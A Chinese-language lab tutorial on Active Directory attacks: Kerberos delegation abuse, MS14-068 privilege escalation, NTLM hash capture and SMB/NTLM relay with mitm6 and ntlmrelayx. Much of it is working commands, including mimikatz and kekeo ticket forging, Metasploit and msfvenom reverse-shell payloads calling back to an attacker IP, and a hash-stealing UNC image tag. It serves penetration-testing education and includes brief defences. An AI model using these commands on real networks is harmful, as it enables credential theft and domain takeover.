## 委派

在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。

“Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。

![image](https://image.3001.net/images/20230425/1682389849_64473b593fd9c6813520a.png!small)

User访问主机s2上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是S2并不知道User是否有权限访问SQLServer。

这时HTTP服务会利用User的身份去访问SQLServer，如果User有权限访问SQLServer服务才能访问成功。

而委派主要分为`非约束委派（Unconstraineddelegation）`和`约束委派（Constrained delegation）`两个方式。

### 非约束委派

  * KDC（Key Distribution Center）= 密钥分发中心

  * AS（Authentication Service）= 认证用户的身份，并为其发放TGT的服务

  * TGT（Ticket Granting Ticket）= TGT认证票据，由AS服务发放

  * TGS（Ticket Granting Service）= 票据发放服务

  * ST（Service Tickets）= ST服务票据，由TGS服务发送

  * AP（Application Server）= 提供用户所需的服务

非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。

![image](https://image.3001.net/images/20230425/1682389863_64473b6763bbc03435743.png!small)

流程：

  1. 用户通过发送KRB_AS_REQ消息请求可转发TGT（forwardable TGT，为了方便我们称为TGT1）。

  2. KDC在KRB_AS_REP消息中返回TGT1。

  3. 用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称为TGT2）。

  4. 在KRB_TGS_REP消息中返回转发TGT2。

  5. 用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket）。

  6. TGS返回给用户一个ST。

  7. 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey。

  8. Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据。

  9. KDC在KRB_TGS_REP消息中返回Service2到Service1的票据。

  10. Service1以用户的名义像Service2发送KRB_AP_REQ请求。

  11. Service2响应步骤10中Service1的请求

  12. Service1响应步骤7中用户的请求。

  13. 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。

  14. KDC返回步骤13中请求的票据。

  15. 15和16即为Service1通过模拟用户来访问其他Service。

可以看到在前5个步骤中User向KDC申请了`两个TGT（步骤2和4）`，一个用于`访问Service1`一个用于`访问Service2`，并且会将这两个都发给Service1。

并且`Service1会将TGT2保存在内存中`。

 **非约束委派的设置：**

Windows域中可以直接在账户属性中设置：

![image](https://image.3001.net/images/20230425/1682389877_64473b7521e1f9bec10ab.png!small)

### 约束委派

由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。

约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服  
务。

这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service forUser to
Proxy）的Kerberos协议扩展。

从下图可以看到整个过程其实可以分为两个部分，第一个是S4U2Self的过程（流程1-4），第二个是S4U2Proxy的过程（流程5-10）。

![image](https://image.3001.net/images/20230425/1682389889_64473b81661d923231446.png!small)

 **流程：**

>   1. 用户向Service1发送请求。
>
>

>   2.
> 这时在官方文档中的介绍是在这一流程开始之前Service1已经通KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。
>
>

>   3.
> KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。
>
>

>   4. Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。
>
>

`注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。`

>   5. 用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点：
>
>

A. Service1已经验证通过，并且有一个有效的TGT。

B. Service1有从用户到Service1的forwardableST（可转发ST）。

​ 个人认为这里的forwardable ST其实也就是ST1。

>   6. Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client
> name）和crealm（client realm）字段标识。
>
>

>   7. KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。
>
>

>
>
> 如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。

>   8. Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。
>
>

>   9. Service2响应Service1的请求。
>
>

>   10. Service1响应用户的请求.
>
>

在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。

S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。

更多的细节可以参考官方的文档，和RFC4120的内容。

同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。

 **约束委派的配置：**

可以在账户属性中将SRV-DB-ODAY的委派方式更改为约束委派

![image](https://image.3001.net/images/20230425/1682389904_64473b908a8ee0e7179fd.png!small)

## 发现域中的委派主机或账户

在域中，可以通过PowerView脚本来搜索开启了委派的主机和用户。

查询非约束委派主要是通过搜索`userAccountControl属性`包含`ADS_UF_TRUSTED_FOR_DELEGATION的主机或账户`。

而约束委派则通过查询`userAccountControl属性`包含`TRUSTED_TO_AUTH_FOR_DELEGATION的主机或用户`。

### 非约束委派

通过`Import-Module PowerView.ps1`加载PowerView脚本之后使用下面的命令进行查询。

 **查询域中配置非约束委派的账户：**

> Get-NetUser -Unconstrained -Domain rootkit.org

 **查询域中配置非约束委派的主机：**

> Get-NetComputer -Unconstrained -Domain rootkit.org

### 约束委派

 **查询域中配置约束委派的账户：**

> Get-DomainUser -TrustedToAuth -Domain rootkit.org

 **查询域中配置约束委派的主机:**

> Get-DomainComputer -TrustedToAuth -Domain rootkit.org

## 委派攻击利用

### 非约束委派的利用

假设已经获取了一个已经配置了委派的账户权限或者是密码，现在我们通过这些条件来攻击其他账户

在域中只有服务账户才能有委派功能，所以先把用户sqladmin设置为服务账号。

> setspn -U -A variant/golden sqladmin

![image](https://image.3001.net/images/20230425/1682389919_64473b9fdd11a42065ebf.png!small)

> setspn -l sqladmin

查看配置成功

  

然后在`“AD用户和计算机”`中将`sqladmin`设置为`非约束委派模式`

![image](https://image.3001.net/images/20230425/1682389932_64473bac6aa5744afeb58.png!small)

在域控上使用`Administrator `访问`sqladmin`所在主机`Srv-Web-Kit`的SMB服务。

> dir \Srv-Web-Kit.rootkit.org\c$

![image](https://image.3001.net/images/20230425/1682389943_64473bb7c425f193c26bd.png!small)

在Srv-Web-Kit上通过mimikatz可以导出Administrator发送过来的TGT内容。

这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。

再使用sekurlsa::tickets/export命令导出内存中所有的票据。

![image](https://image.3001.net/images/20230425/1682389971_64473bd36170be11c4ae4.png!small)

访问域控失败

![image](https://image.3001.net/images/20230425/1682389984_64473be0c50bfd877ab94.png!small)

通过

> kerberos::ptt [0;a17510]-2-0-60a10000-Administrator@krbtgt-ROOTKIT.ORG.kirbi

命令将TGT内容导入到当前会话中。

![image](https://image.3001.net/images/20230425/1682389995_64473beb9d6237b6ccc5e.png!small)

导入之后已经可以访问域控的共享目录。

也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT  
保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。

![image](https://image.3001.net/images/20230425/1682390006_64473bf60886c40f59d1a.png!small)

### 约束委派的利用

假设已知配置了约束委派的账号，并且已知当前配置了约束委派的当前账户的密码。

  1. 确认账号sqladmin设置了约束委派。

![image](https://image.3001.net/images/20230425/1682390016_64473c00257db56e2b15c.png!small)

  2. 使用kekeo对域控发起申请TGT的请求。

通过已知的账户名和明文密码对KDC发起请求，得到TGT.

> tgt::ask /user:sqladmin /domain:rootkit.org /password:Admin12345
> /ticket:sqladmin.kirbi

![image](https://image.3001.net/images/20230425/1682390025_64473c09c12b0af56e82e.png!small)

> /user:当前用户名
>
> /domain:所在域名
>
> /password:当前用户名的密码
>
> /ticket:生成票据名称。

  3. 使用kekeo申请TGS票据

![image](https://image.3001.net/images/20230425/1682390035_64473c13e2fe9c0b2358c.png!small)

> tgs::s4u /tgt:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi
> /user:administrator@rootkit.org /service:cifs/owa2013.rootkit.org

> /tgt:上一步通过kekeo生成的tgt票据
>
> /user:想要伪造的用户名写全称（用户名@域名）
>
> /service:想要伪造访问的服务名（服务名/主机的FQDN名称)

  4. 使用mimikatz将生成的TGS文件导入到Kerberos凭据列表中

![image](https://image.3001.net/images/20230425/1682390046_64473c1eeae9a34ddb8f9.png!small)

这时可以看到导入之后已经能够成功访问域控的共享文件（严格来说应该是非约束委派中设置的SPN的权限）。

而且在这个过程中是不需要管理员权限的，只是用当前账户的权限就可以完成，因为不需要从内存中导出票据。

 **非约束委派去获得所设置的SPN的权限主要是三个步骤**

  1. 请求TGT

  2. 请求TGS

  3. 将TGS导入内存

第1步：

使用Kekeo发起AS-REQ请求去请求TGT。

这时sqladmin获取到了一个TGT，并且kekeo工具将其保存为一个kirbi格式的文件。

第2步：

再使用这个TGT申请两个ST文件，上文中说到过在约束委派实现的过程中分为两个部分，分别是S4U2Self扩展和S4U2Proxy扩展。

S4U2Self中Service1会代替用户向KDC申请一张用于访问自身的TGS，这个TGS也就是生成的两个TGS中的一个（TGS_administrator@rootkit.org@ROOTKIT.ORG_sqladmin@ROOTKIT.ORG.kirbi），还有一个TGS是用于访问非受限委派中设置的SPN的TGS（TGS_administrator@rootkit.org@ROOTKIT.ORG_cifs~owa2013.rootkit.org@ROOTKIT.ORG.kirbi）。

关于约束委派的这种攻击方式就是通过在Service1（sqladmin）中将自己伪造成用户，然后获取允许约束委派的SPN的TGS的一个过程。

## 委派攻击的防御

通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以`最好是不要在域中使用非约束委派`这种功能。

域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。

![image](https://image.3001.net/images/20230425/1682390058_64473c2a692cbf14620df.png!small)

## Kerberos简介

在Kerberos认证中，最主要的问题是如何证明“你是你”的问题，如当一个Client去访问Server服务器上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不影响通讯的安全性，这正是Kerberos解决的问题。

在域渗透过程中Kerberos协议的攻防也是很重要的存在。

### Kerberos协议框架

  * 访问服务的Client

  * 提供服务的Server

  * KDC(Key Distribution Center)密钥分发中心

其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。

在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。

![image](https://image.3001.net/images/20230425/1682390068_64473c347dd4460c08dc4.png!small)

如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。

如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。

当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一  
张。

由上图中可以看到KDC又分为两个部分：

`Authentication Server`： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket
Granting Ticket）票给Client。

`Ticket Granting Server`： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。

ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。

![image](https://image.3001.net/images/20230425/1682390081_64473c413b77b77a30dd0.png!small)

KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。

![image](https://image.3001.net/images/20230425/1682390097_64473c512c1057a8f8f37.png!small)

### Kerberos认证

流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：

  1. `The Authentication Service Exchange`：Client与AS的交互

  2. `The Ticket-Granting Service (TGS) Exchange`：Client与TGS的交互

  3. `The Client/Server Authentication Exchange`：Client与Server的交互

![image](https://image.3001.net/images/20230425/1682390108_64473c5c43bc28eefd40c.png!small)

 **(1)TheAuthentication Service Exchange**

KRB_AS_REQ

Client->AS：发送 Authenticator1(Client 密码加密 TimeStamp)

第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash
加密的时间戳、ClientID、网络地址、加密类型等内容。

![image](https://image.3001.net/images/20230425/1682390118_64473c6684159d99d053e.png!small)

KRB_AS_REP

AS-> Client：发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和TimeStamp)

在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。

验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGTHASH 加密的
sessionkey-as 和 TimeStamp 等信息）。

 **(2)TheTicket-Granting Service (TGS) Exchange**

KRB_TGS_REQ

Client ->TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT
HASH 加密的sessionkey-as 和 TimeStamp)

Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC
密码加密，Client 无法解密。

这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的TGS（TicketGranting
Server）票据授权服务器换取能够访问 Server 的票据。

![image](https://image.3001.net/images/20230425/1682390132_64473c742bc7c3ede4aa2.png!small)

KRB_TGS_REP

TGS-> Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH
加密 sessionkey-tgs)

TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client
所请求的服务。

如果服务存在，则用 KRBTGT 密码解密 TGT。

一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。

验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server密码 HASH 加密的 Sessionkey-tgs
发送给 Client。

 **(3)TheClient/Server Authentication Exchange**

KRB_AP_REQ

Client ->Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server
密码 HASH 加密sessionkey-tgs)

Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs
之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST
一起发送给 Server。

![image](https://image.3001.net/images/20230425/1682390142_64473c7e88ec7e5e8a3bf.png!small)

KRB_AP_REP

Server-> Client

server 通过自己的密码解密 ST，得到 sessionkey-tgs, 再用 sessionkey-tgs 解密 Authenticator3
得到TimeStamp，验证正确返回验证成功。

参考链接：

https://zhuanlan.zhihu.com/p/473625225

## MS14-068

MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。

### 利用方式

MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。

![image](https://image.3001.net/images/20230425/1682390153_64473c8992e8e0d284fde.png!small)

一、在域内主机jerry上通过dir来访问域控的共享文件夹，示拒绝访问。

> dir \OWA2010SP3.0day.org\c$

![image](https://image.3001.net/images/20230425/1682390162_64473c929820a511cf083.png!small)

二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。

 **参数说明：**

> -u 域账号+@+域名称，这里是jerry+@+rootkit.org

> -s为jerry的SID值，可以通过whoami/all来获取用户的SID值

> -d为当前域的域控  
>
> ![image](https://image.3001.net/images/20230425/1682390172_64473c9c10cd2c3c1f9cb.png!small)

> MS14-068.exe -u sqladmin@0day.org -p admin!@#45 -s
> S-1-5-21-1812960810-2335050734-3517558805-1142 -d OWA2010SP3.0day.org

![image](https://image.3001.net/images/20230425/1682390184_64473ca85c6f24a5220a2.png!small)

脚本执行成功会在当前目录下生成一个ccache文件。

![image](https://image.3001.net/images/20230425/1682390194_64473cb29aadf90aa8583.png!small)

三、使用mimikatz导入生成的ccache文件，导入之前cmd下使用命令klist
purge或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。

> klist purge

![image](https://image.3001.net/images/20230425/1682390204_64473cbc832a9f144d833.png!small)

> kerberos::ptc TGT_sqladmin@0day.org.ccache

![image](https://image.3001.net/images/20230425/1682390214_64473cc65519e50dd94a3.png!small)

再次dir访问域控共享就可以成功访问

> dir \OWA2010SP3.0day.org\c$

![image](https://image.3001.net/images/20230425/1682390224_64473cd09a00015eb5ace.png!small)

### goldenPac.exe

impacket工具包里面的goldenPac.py，这个工具是结合ms14-068加psexec的产物，利用起来十分顺手。

这里用到的是编译的exe文件。

> goldenPac.exe 0day.org/sqladmin:admin!@#45@OWA2010SP3.0day.org

![image](https://image.3001.net/images/20230425/1682390236_64473cdc4bf483d9b36f6.png!small)

当然此工具不止是得到一个shell，我们甚至可以直接让该域控运行我们上传的程序。

这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。

这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。

## 相关概念

### NTLM hash 和 Net-NTLM hash

NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash

该hash的生成方法：

  1. 将明文口令转换成十六进制的格式

  2. 转换成Unicode格式，即在每个字节之后添加0x00

  3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串

在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM
hash

 **Net-NTLM hash是指网络环境下NTLM认证中的hash**

NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：

  1. 客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash

  2. 服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1

  3. 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器

  4. 服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功

在以上流程中，登录用户的密码hash即 NTLM hash ，response中包含`Net-NTLM hash`

在NTLM认证中，NTLM响应分为`NTLM v1`，`NTLMv2`，`NTLM session
v2`三种协议，不同协议使用不同格式的Challenge和加密算法

所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash

从攻击角度来看

  * 可以利用NTLM哈希值进行“哈希传递”攻击

  * 无法利用Net-NTLM哈希值来进行“哈希传递”攻击

### NTLM和SMB的关系

SMB的认证可以基于NTLM协议或者kerberos协议，前者使用了hash，后者使用了ticket，是构成SMB的 PtH 和 PtT攻击的基础。

NTLM 并没有定义它所依赖的传输层协议。NTLM 消息的传输完全依赖于使用 NTLM 的上层协议来决定，可以是SMB，也可以是TCP，亦或HTTP。

### 跨协议的 NTLM-Relay

前面说过，NTLM 的上层协议基本可以是任何协议（如果上层是基于UDP 的议的话，可能会不一样），所以这引出了跨协议的 NTLM-Relay 技巧。

无论 NTLM 的上层协议是什么，其携带的 NTLM 的三条消息都是

由 NTLM SSP 生成的，所以上层协议在 relay 的过程中，是可以被替换掉的。

比如从`http relay`至`smb`，从`smb relay`至`ldap/mssql `等等。

我们只需要将一个协议中的 NTLM 消息取出来，然后原样不动的地放入另一个协议，就完成了上层协议转换的过程。

## SMB RELAY

mitm Attacker通过不停的转换机器角色来同时欺骗Smb
server和Client两端，可以拿着Client的凭据去访问SmbServer中的资源,如果这个凭据的用户权限在smb
server中很大,大到可以随意操作smb server,此时凭据再一旦认证成  
功,随后再立即执行一段shellcode,那Smb server基本也就沦陷了。

![image](https://image.3001.net/images/20230425/1682390250_64473cead70b39e465240.png!small)

### 利用条件

#### SMB版本信息

不同Windows版本所对应的Smb
版本，smb版本越高，内置的安全机制就越完善,利用难度也就越大，另外，它默认工作在tcp/udp的139和445端口上,属上层协议[偏应用层]。

  * Smb v1 主要用于xp/2003以下的系统中

  * Smb v2.x 主要用于win vista/7/2008/2008r2

  * Smb v3.x 主要用于win 8 / 8.1 / 2012 / 2012r2 /2016

#### 利用条件

  * 目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win7/8/8.1/10]默认都不会开。

  * 对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用也是无效的。

#### 检查是否开启smb签名

> nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery  
> 192.168.0.106,192.168.0.108

![image](https://image.3001.net/images/20230425/1682390260_64473cf4dbad1ce066b17.png!small)

### 利用方式

#### Inveigh

powershell编写，可供参考的地址：

https://github.com/Kevin-Robertson/Inveigh

> Import-Module .\Inveigh.psd1  
> Invoke-Inveigh -consoleoutput Y

![image](https://image.3001.net/images/20230425/1682390408_64473d88b852b0d0fcf1c.png!small)

再使用另外一个主机去连接该服务器。

![image](https://image.3001.net/images/20230425/1682390418_64473d929d56fb1fa5dda.png!small)

原主机上就可以捕获到net-ntlm v2 hash。

![image](https://image.3001.net/images/20230425/1682390429_64473d9d41fe5cf1d78a4.png!small)

拿到net-ntlm v2 的hash以后,可以用hashcat进行爆破

Hashcat参数如下：

> hashcat -m 5600 net-ntlm hash /tmp/password.list -o found.txt --force

若已获取权限的主机上存在web服务，我们可以在网站里插一个带有unc路径的图片，它请求资源走的是`smb[file://]`。

> <img src="\192.168.3.68\test.jpg"

当有主机访问该主页是，我们也能在 Inveigh 捕获到该主机的net-ntlm v2 hash。

#### smb_relay

在kali 192.168.22.128利用`windows/smb/smb_relay`模块进行攻击。

> msf5 > use windows/smb/smb_relay
>
> msf5 exploit(windows/smb/smb_relay) > set smbhost 192.168.22.162  
> smbhost => 192.168.22.162
>
> msf5 exploit(windows/smb/smb_relay) > set payload
> windows/meterpreter/reverse_tcp  
> payload => windows/meterpreter/reverse_tcp
>
> msf5 exploit(windows/smb/smb_relay) > set lhost 192.168.22.128  
> lhost => 192.168.22.128
>
> msf5 exploit(windows/smb/smb_relay) > set lport 2333  
> lport => 2333
>
> msf5 exploit(windows/smb/smb_relay) > show options
>
> Module options (exploit/windows/smb/smb_relay):  
> Name Current Setting Required Description
>
> * * *
>
> SHARE ADMIN$ yes The share to connect to
>
> SMBHOST 192.168.22.162 no The target SMB server (leave empty for originating  
> system)
>
> SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address  
> on the local machine or 0.0.0.0
>
> SRVPORT 445 yes The local port to listen on.
>
> Payload options (windows/meterpreter/reverse_tcp):
>
> Name Current Setting Required Description
>
> * * *
>
> EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process,  
> none)
>
> LHOST 192.168.22.128 yes The listen address (an interface may be specified)
>
> LPORT 2333 yes The listen port
>
> Exploit target:  
> Id Name
>
> * * *
>
> 0 Automatic

在192.168.22.130上执行

> net use \192.168.22.128\c$ /user:"administrator" "1qaz@wsx"

在kali上就可以看到回显了

![image](https://image.3001.net/images/20230425/1682390443_64473dabc353939cc12eb.png!small)

回显里会删除exe文件，所以建议在配置时做好进程迁移

> set AutoRunScript post/windows/manage/migrate

#### smbrelayx.py

https://www.sans.org/offensive-operations/

在工具主机kali 192.168.22.128上执行

> python smbrelayx.py -h 192.168.22.162

在内网主机192.168.22.130上执行

> net use \192.168.22.128\c$ /user:"administrator" "1qaz@wsx"

![image](https://image.3001.net/images/20230425/1682390456_64473db89ec0c5093f727.png!small)

此时在主机kali 192.168.22.128上就能捕获到如下内容。

![image](https://image.3001.net/images/20230425/1682390465_64473dc1593f894134b8d.png!small)

当目标内网有机器192.168.22.130访问到我们的恶意smb服务器192.168.22.128后,便会抓取对应机器的net-ntlm
v2hash,之后再通过smbrelayx.py脚本拿着这段抓到的hash去尝试重放192.168.22.162这台目标机器。

一旦重放成功,便会把162这台机器的本地用户及密码hash全部解密导出来。

smbrelayx.py可以执行命令和上传木马文件。

> python smbrelayx.py -h 192.168.22.162 -c whoami

![image](https://image.3001.net/images/20230425/1682390475_64473dcbdad8575a1c432.png!small)

结合msf上传exe木马。生成一个exe木马。

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.22.128 LPORT=4444
> -e x86/shikata_ga_nai -f exe -o test.exe

启用 msfconsole 中`exploit/multi/handler`监听模块

> msf > use exploit/multi/handler  
> msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
> msf exploit(multi/handler) > set lhost 192.168.22.128  
> msf exploit(multi/handler) > set lport 4444  
> msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate  
> msf exploit(multi/handler) > exploit -j  
> [*] Exploit running as background job 1.  
> [*] Started reverse TCP handler on 192.168.138.136:4444

执行

> python smbrelayx.py -h 192.168.22.162 -e test.exe

![image](https://image.3001.net/images/20230425/1682390487_64473dd72cd12dfc476f2.png!small)

#### Responder

自从MS08-068漏洞修复之后无法再将`Net-NTLM`哈希值传回到发起请求的机器上，除非进行跨协议转发，但是该哈希值仍然可以通过中继转发给另外一台机器。

利用Responder结合其他中继工具可以进行自动化的拦截并且对哈希值进行中继转发。唯一的一个不足之处就是，在这之前需要在进行转发操作的机器上禁用SMB签名。

> 在开启了 SMB Signing 的情况下，在 SMB 协议利用 NTLM SSP 进行了身份验证后，后续的所有数据包，都会利用 NTLM SSP
> 生成的这个 session key 进行签名。
>
> SMB 服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。

> NTLM SSP 在生成 session key 的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。
>
> 而 relay 型的攻击，都是站在一个中间人的位置，我们是不可能知道原始的 LM HASH 或 NT HASH 的（如果知道了也就不需要 Relay
> 这种攻击手法了）。
>
> 所以，我们是无法计算出来这个 session key 的，自然也就无法对数据包进行签  
> 名。

Responder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 –
响应验证过程并捕获客户端发送的必要 hash。

> python Responder.py -I eth0 -v

![image](https://image.3001.net/images/20230425/1682390499_64473de365da1a54bfcea.png!small)

对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录。所以在192.168.22.130上执行`dir
\\192.168.22.128\c$`

![image](https://image.3001.net/images/20230425/1682390513_64473df1451313731ba2a.png!small)

在192.168.22.128上就可以得到NTLMv2 Hash。

![image](https://image.3001.net/images/20230425/1682390522_64473dfa7b6e47df94c50.png!small)

responder只有一个回显hash功能，可以结合`ntlmrelayx.py
`和`Empire框架`进行进一步利用。再借助`DeathStar`，可以很轻易获取windows的域管理权限。

## NTLM-Relay

### NTLM Relaying与Kerberos委派组合

#### 实现方法

在目标计算机上创建一个新的计算机账号B，并为本地计算机账号A设置基于资源的约束委派给新建账号B，使得B可以模拟用户访问A的资源，便能通过S4U攻击（首先使用S4U2Self获取任意用户到新建计算机账号B的服务票据，再  
使用S4U2Proxy获取该用户到目标计算机A的服务票据），使用该计算机账号为域内任意用户请求访问该计算机任意服务的TGS服务票据，从而获得该计算机的SYSTEM权限。

![image](https://image.3001.net/images/20230425/1682390533_64473e059b33071ec6958.png!small)

#### 利用过程

使用mitm6选择目标计算机并回复DHCPv6请求，为其分配地址，回复WPAD配置文件地址

>  **mitm6 -hw ws02 -d lab.local --ignore-nofqnd**

![image](https://image.3001.net/images/20230425/1682390541_64473e0dc037919d66f3e.png!small)

设置目标LDAP服务器地址并创建WPAD配置文件，使用“–delegate-access”为目标创建计算机账号并配置基于资源的约束委派：

启动ntlmrelayx，指定域控制器，委派攻击，禁用SMB服务器并设置将生成并提供给目标的恶意WPAD文件的名称。

> ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server
> -wh attacker-wpad

![image](https://image.3001.net/images/20230425/1682390552_64473e18c0e7d8bf2c049.png!small)

当目标计算机重启或重新进行网络配置（如重新插入网线）时，
将会向DHCPv6发送请求获取IPv6配置，我们已经使用mitm6接管DNS，此时目标计算机便会访问kali获取WPAD配置文件，并将kali设置为为代理服务器
。

![image](https://image.3001.net/images/20230425/1682390562_64473e226718faff1a3a9.png!small)

然后当目标计算机通过kali代理服务器访问网络时，kali将会向目标计算机发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成相关操作。

接下来，便可通过impacket中的getST脚本，使用新创建的计算机账号为域管理员（或具有本地管理员权限的域用户）请求访问到该计算机的CIFS服务票据：

![image](https://image.3001.net/images/20230425/1682390572_64473e2c5f2d35bb54dca.png!small)

导入

> export KRB5CCNAME=lkys.ccache

![image](https://image.3001.net/images/20230425/1682390713_64473eb95e1291e46eb36.png!small)

然后就可以通过psexec.py远程执行命令了。

> psexec.py -k ws02.lab.local -debug -no-pass

![image](https://image.3001.net/images/20230425/1682390723_64473ec392ec800f0b251.png!small)

尝试复现上述过程，失败了。报的错是：

> [-] Connection against target ldaps://OWA2010SP3.0day.org FAILED: invalid
> server address  
> [-] Exception in HTTP request handler: invalid server address  
> [-] Exception in HTTP request handler: [Errno 104] Connecti

![image](https://image.3001.net/images/20230425/1682390733_64473ecd10e0cfdc51371.png!small)

